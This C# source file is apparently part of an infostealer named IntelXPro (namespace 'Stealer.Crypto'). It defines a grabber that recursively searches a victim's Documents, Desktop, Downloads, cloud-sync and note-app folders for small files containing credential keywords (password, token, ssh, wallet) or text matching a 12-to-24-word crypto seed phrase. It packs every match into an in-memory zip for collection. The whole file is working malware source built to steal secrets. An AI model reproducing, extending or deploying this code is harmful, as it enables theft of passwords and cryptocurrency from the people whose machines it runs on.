using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.General;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Crypto
{
    internal class Grabber : ITarget
    {
        private readonly long _sizeMinFile = 120L;

        private readonly long _sizeLimitFile = 6144L;

        private readonly long _sizeLimit = 5242880L;

        private long _size;

        private readonly Regex _seedRegex = new Regex("^(?:\\s*\\b[a-z]{3,}\\b){12,24}\\s*$", RegexOptions.IgnoreCase | RegexOptions.Multiline | RegexOptions.Compiled);

        private readonly string[] _blacklist = new string[10] { "license", "readme", "changelog", "about", "terms", "eula", "notice", "example", "sample", "test" };

        private readonly string[] _keywords = new string[35]
        {
        "password", "passwd", "pwd", "pass", "login", "user", "username", "account", "mail", "email",
        "secret", "key", "private", "public", "wallet", "mnemonic", "seed", "recovery", "phrase", "backup",
        "pin", "auth", "2fa", "token", "apikey", "api_key", "ssh", "cert", "certificate", "crypto",
        "btc", "eth", "usdt", "ltc", "xmr"
        };

        private readonly string[] _seedExtensions = new string[9] { ".seed", ".seedphrase", ".mnemonic", ".phrase", ".key", ".secret", ".txt", ".backup", ".wallet" };

        private readonly string[] _seedPaths = new string[19]
        {
        Environment.GetFolderPath(Environment.SpecialFolder.Personal),
        Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
        Environment.GetFolderPath(Environment.SpecialFolder.Personal),
        Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
        Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory),
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads",
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\OneDrive",
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Dropbox",
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\iCloudDrive",
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Google Drive",
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\YandexDisk",
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Mega",
        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Evernote",
        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Standard Notes",
        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Joplin",
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Wallets",
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Keys",
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Crypto",
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Backup"
        };

        private long Size
        {
            get
            {
                return Interlocked.Read(ref _size);
            }
            set
            {
                Interlocked.Exchange(ref _size, value);
            }
        }

        public void Collect(InMemoryZip zip, Counter counter)
        {
            Parallel.ForEach(_seedPaths, delegate (string directory)
            {
                SearchFiles(zip, counter, directory);
            });
        }

        private void SearchFiles(InMemoryZip zip, Counter counter, string directory)
        {
            if (Size > _sizeLimit)
            {
                return;
            }
            try
            {
                Parallel.ForEach(Directory.GetDirectories(directory), delegate (string subDir)
                {
                    if (Size <= _sizeLimit)
                    {
                        SearchFiles(zip, counter, subDir);
                    }
                });
            }
            catch
            {
            }
            try
            {
                Parallel.ForEach(Directory.GetFiles(directory), delegate (string file)
                {
                    if (Size <= _sizeLimit)
                    {
                        FileInfo fileInfo = new FileInfo(file);
                        if (_seedExtensions.Contains(fileInfo.Extension, StringComparer.OrdinalIgnoreCase) && fileInfo.Length < _sizeLimitFile && fileInfo.Length > _sizeMinFile)
                        {
                            string text = File.ReadAllText(fileInfo.FullName);
                            if (ContainsKeyword(fileInfo.Name) || ContainsKeyword(text) || ContainsSeedPhrase(text))
                            {
                                Size += fileInfo.Length;
                                string text2 = "Files\\" + fileInfo.Name + RandomStrings.GenerateHashTag() + fileInfo.Extension;
                                zip.AddTextFile(text2, text);
                                counter.FilesGrabber.Add(file + " => " + text2);
                            }
                        }
                    }
                });
            }
            catch
            {
            }
        }

        private bool ContainsSeedPhrase(string content)
        {
            return _seedRegex.IsMatch(content);
        }

        private bool ContainsKeyword(string content)
        {
            if (string.IsNullOrEmpty(content))
            {
                return false;
            }
            string[] source = content.Split(new char[14]
            {
            ' ', '\t', '\r', '\n', ',', '.', ';', ':', '-', '_',
            '/', '\\', '"', '\''
            }, StringSplitOptions.RemoveEmptyEntries);
            HashSet<string> whitelist = new HashSet<string>(_keywords, StringComparer.OrdinalIgnoreCase);
            HashSet<string> blacklist = new HashSet<string>(_blacklist, StringComparer.OrdinalIgnoreCase);
            int result = 0;
            Parallel.ForEach(source, delegate (string word, ParallelLoopState state)
            {
                if (Volatile.Read(ref result) == -1)
                {
                    state.Stop();
                }
                else if (blacklist.Contains(word))
                {
                    Interlocked.Exchange(ref result, -1);
                    state.Stop();
                }
                else if (whitelist.Contains(word))
                {
                    Interlocked.CompareExchange(ref result, 1, 0);
                }
            });
            return result == 1;
        }
    }
}
